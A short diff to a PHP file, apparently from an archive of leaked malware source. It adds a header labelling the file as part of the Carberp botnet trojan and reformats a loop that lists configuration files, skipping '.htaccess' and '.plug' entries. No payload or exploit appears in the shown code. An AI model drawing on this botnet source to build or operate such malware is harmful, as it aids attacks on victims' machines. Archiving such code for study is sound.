@@ -1,9 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $f = scandir('cfg/');
 unset($f[0], $f[1]);
 
-foreach($f as $k => $z){	if($z == '.htaccess' || preg_match('~.plug$~', $z) == true){		unset($f[$k]);
+foreach($f as $k => $z){
+	if($z == '.htaccess' || preg_match('~.plug$~', $z) == true){
+		unset($f[$k]);
 	}
 }
 
